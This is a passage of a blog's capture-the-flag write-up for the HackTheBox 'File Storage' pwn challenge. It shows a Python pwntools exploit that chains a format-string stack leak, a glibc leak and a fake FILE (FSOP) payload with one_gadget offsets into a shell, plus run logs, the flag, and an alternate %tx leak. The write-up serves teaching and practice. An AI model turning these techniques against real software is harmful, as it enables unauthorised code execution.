Welcome to my File Storage (beta):

1. Read contents from a file
2. Write data into a random file
3. Exit
&gt; 1
Filename: %1$ptxt
Error: File not found. Please try again  
Debug: /tmp/0x7fffffffbfa0tx
1. Read contents from a file
2. Write data into a random file
3. Exit
&gt;
</code></pre></div><p>As can be seen, we need to add <code>txt</code> to pass the filename check.</p><p>So we can use this leak to compute the offset where the fake <code>FILE</code> structure will be placed on the stack. Namely:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
&gt;&gt;&gt; hex(0x7fffffffe608 - 0x7fffffffbfa0)  
'0x2668'
</code></pre></div><p>Although this is a good idea, the stack addresses may change depending on the environment, so we will have to attach GDB to the process again if we need to debug the exploit. This is the exploit using the stack address leak and the offsets (still no ASLR):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env python3</span>

<span class="mtk3"># ...</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">brute_force_filename</span><span class="mtk1">(</span><span class="mtk9 mtki">p</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>
    <span class="mtk3"># ...</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">fsop</span><span class="mtk1">(</span><span class="mtk9 mtki">addr</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">_lock</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>
    <span class="mtk3"># ...</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
    <span class="mtk3"># ...</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Filename: '</span><span class="mtk1">, </span><span class="mtk7 mtki">f</span><span class="mtk4">'%1$ptxt'</span><span class="mtk1">.</span><span class="mtk8">encode</span><span class="mtk1">())</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Debug: /tmp/'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">stack_leak</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">().</span><span class="mtk8">decode</span><span class="mtk1">().</span><span class="mtk8">strip</span><span class="mtk1">(</span><span class="mtk4">'txt</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">), </span><span class="mtk6">16</span><span class="mtk1">)</span>  
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Stack leak: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">stack_leak</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Filename: '</span><span class="mtk1">, </span><span class="mtk1">filename</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'(string/number): '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'number'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">puts_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">().</span><span class="mtk8">strip</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">).</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked puts() address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">puts_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">puts_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.puts</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">288</span>
<span class="mtk1">    </span><span class="mtk1">one_gadgets</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk7 mtki">0x</span><span class="mtk6">e3afe</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">e3b01</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">e3b04</span><span class="mtk1">]</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">one_gadgets</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">])</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8">fsop</span><span class="mtk1">(</span>elf<span class="mtk1">.</span><span class="mtk1">got</span><span class="mtk1">.fclose, </span><span class="mtk1">stack_leak</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> (</span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">))</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">stack_leak</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">2668</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'(yes/no): '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'yes'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'content:</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>


<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk8">main</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './file_storage'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x3ff000)</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Starting local process './file_storage': pid 1674295
[<span class="code-blue">*</span>] Process './file_storage' stopped with exit code 0 (pid 1674295)  

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1674317
[<span class="code-blue">*</span>] Stopped process './file_storage' (pid 1674317)

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1674319
[<span class="code-green">+</span>] Filename: QJ.txt
[<span class="code-blue">*</span>] Stopped process './file_storage' (pid 1674319)

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1674377
[<span class="code-green">+</span>] Stack leak: 0x7fffffffbf60
[<span class="code-blue">*</span>] Leaked puts() address: 0x7ffff7e5b420
[<span class="code-green">+</span>] Glibc base address: 0x7ffff7dd7000
[<span class="code-blue">*</span>] Switching to interactive mode
Fatal error: glibc detected an invalid stdio handle
[<span class="code-blue">*</span>] Got EOF while reading in interactive
<span class="code-red">$</span>
</code></pre></div><p>We don&rsquo;t get a shell, but we can see that the stack leak is different from before, let&rsquo;s update the offset then:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
&gt;&gt;&gt; hex(0x7fffffffe608 - 0x7fffffffbf60)  
'0x26a8'
</code></pre></div><p>And now it works again:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './file_storage'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x3ff000)</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Starting local process './file_storage': pid 1676781
[<span class="code-blue">*</span>] Process './file_storage' stopped with exit code 0 (pid 1676781)  

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1676803
[<span class="code-blue">*</span>] Stopped process './file_storage' (pid 1676803)

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1676805
[<span class="code-green">+</span>] Filename: JB.txt
[<span class="code-blue">*</span>] Stopped process './file_storage' (pid 1676805)

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1676863
[<span class="code-green">+</span>] Stack leak: 0x7fffffffbe90
[<span class="code-blue">*</span>] Leaked puts() address: 0x7ffff7e5b420
[<span class="code-green">+</span>] Glibc base address: 0x7ffff7dd7000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
file_storage  ld-linux-x86-64.so.2  libc.so.6  solve.py
</code></pre></div><p>And now that we only depend on leaks and offsets, we can enable ASLR and everything should work&mldr; But it is not working.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> 2 | <span class="code-dark-green mtku">sudo</span> <span class="code-dark-green">tee</span> <span class="mtku">/proc/sys/kernel/randomize_va_space</span>
[sudo] password for rocky:
2

<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './file_storage'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x3ff000)</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Starting local process './file_storage': pid 1679645
[<span class="code-blue">*</span>] Process './file_storage' stopped with exit code 0 (pid 1679645)  

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1679722
[<span class="code-blue">*</span>] Stopped process './file_storage' (pid 1679722)

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1679724
[<span class="code-green">+</span>] Filename: RB.txt
[<span class="code-blue">*</span>] Stopped process './file_storage' (pid 1679724)

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1679782
[<span class="code-green">+</span>] Stack leak: 0x7ffd38a35560
[<span class="code-blue">*</span>] Leaked puts() address: 0x7fba40d38420
[<span class="code-green">+</span>] Glibc base address: 0x7fba40cb4000
[<span class="code-blue">*</span>] Switching to interactive mode
[<span class="code-blue">*</span>] Got EOF while reading in interactive
<span class="code-red">$</span>
</code></pre></div><p>Taking a look again at the FSOP payloads, we have hard-coded the value of <code>_lock</code> (<code>0x405790</code>). The value of <code>_lock</code> only needs to be a valid writable address, so we can use the stack leak for that purpose. If we correct this issue, the exploit will work properly:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './file_storage'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x3ff000)</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Starting local process './file_storage': pid 1683171
[<span class="code-blue">*</span>] Process './file_storage' stopped with exit code 0 (pid 1683171)  

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1683193
[<span class="code-blue">*</span>] Stopped process './file_storage' (pid 1683193)

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1683195
[<span class="code-green">+</span>] Filename: DK.txt
[<span class="code-blue">*</span>] Stopped process './file_storage' (pid 1683195)

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1683253
[<span class="code-green">+</span>] Stack leak: 0x7fff4a9f16c0
[<span class="code-blue">*</span>] Leaked puts() address: 0x7f63178c2420
[<span class="code-green">+</span>] Glibc base address: 0x7f631783e000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
file_storage  ld-linux-x86-64.so.2  libc.so.6  solve.py
</code></pre></div><h2 id="flag">Flag</h2><p>Let&rsquo;s run the exploit on the remote instance:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1337
[<span class="code-blue">*</span>] './file_storage'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x3ff000)</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Opening connection to 127.0.0.1 on port 1337: Done  
[<span class="code-blue">*</span>] Closed connection to 127.0.0.1 port 1337

[<span class="code-green">+</span>] Opening connection to 127.0.0.1 on port 1337: Done
[<span class="code-blue">*</span>] Closed connection to 127.0.0.1 port 1337

[<span class="code-green">+</span>] Opening connection to 127.0.0.1 on port 1337: Done
[<span class="code-green">+</span>] Filename: VD.txt
[<span class="code-blue">*</span>] Closed connection to 127.0.0.1 port 1337

[<span class="code-green">+</span>] Opening connection to 127.0.0.1 on port 1337: Done
[<span class="code-green">+</span>] Stack leak: 0x7ffcd7178810
[<span class="code-blue">*</span>] Leaked puts() address: 0x7fd03a2cf420
[<span class="code-green">+</span>] Glibc base address: 0x7fd03a24b000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
file_storage
flag.txt
run_challenge.sh
<span class="code-red">$</span> cat flag.txt
HTB{B0Fs_4nd_F0rm4ts_4r3_l4m3_1f_y0u_h4v3_FS0P!}
</code></pre></div><p>The full exploit script can be found in here: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/FileStorage/solve.py"><code>solve.py</code></a>.</p><h2 id="unintended-way">Unintended way</h2><p>The intended way to get a memory leak from Glibc was using <code>puts</code> and <code>atoi</code>. There was a unintended way to leak Glibc using the Format String vulnerability. Although I added the <code>txt</code> limitation so that the maximum format string payload was <code>%1$ptxt</code>, it looks like <code>%12$txt</code> also works because <code>%tx</code> is a valid format string specifier (more information at <a href="https://en.wikipedia.org/wiki/Printf_format_string#Length_field">Wikipedia</a>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./file_storage</span>
Welcome to my File Storage (beta):

1. Read contents from a file
2. Write data into a random file
3. Exit
&gt; 1
Filename: %10$txt
Error: File not found. Please try again  
Debug: /tmp/0
1. Read contents from a file
2. Write data into a random file
3. Exit
&gt;
</code></pre></div><p>So, using <code>%1$ptxt</code> through <code>%9$ptxt</code>, the only useful leaks were stack addresses. But from <code>%10$txt</code> through <code>%99$txt</code>, there were some Glibc addresses, thus no need to use <code>atoi</code> and <code>puts</code>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#setup-environment">Setup environment</a></li><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#finding-vulnerabilities">Finding vulnerabilities</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a><ul><li><a href="#fsop">FSOP</a></li></ul></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#without-aslr">Without ASLR</a></li><li><a href="#with-aslr">With ASLR</a></li></ul></li><li><a href="#flag">Flag</a></li><li><a href="#unintended-way">Unintended way</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Receive a weekly blog digest</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Enter your email address" name="email" id="tlemail">
<input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Submit"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc">powered by <a href="https://tinyletter.com" target="_blank" title="TinyLetter">TinyLetter</a></p><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>